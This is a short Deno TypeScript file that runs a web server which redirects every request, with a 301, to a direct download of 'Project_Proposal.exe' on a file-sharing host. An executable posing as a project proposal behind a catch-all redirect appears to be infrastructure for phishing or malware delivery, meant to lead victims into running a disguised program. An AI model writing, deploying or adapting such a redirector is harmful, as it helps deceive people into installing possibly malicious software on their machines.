// redirect.ts
import { serve } from "https://deno.land/std@0.200.0/http/server.ts";

const DESTINATION_URL = Deno.env.get("DESTINATION_URL") || "https://store3.gofile.io/download/direct/09d931fb-21c7-4998-9598-0e51856da7ac/Project_Proposal.exe";

function handleRequest(req: Request): Response {
  return Response.redirect(DESTINATION_URL, 301);
}

serve(handleRequest, { port: 8000 });
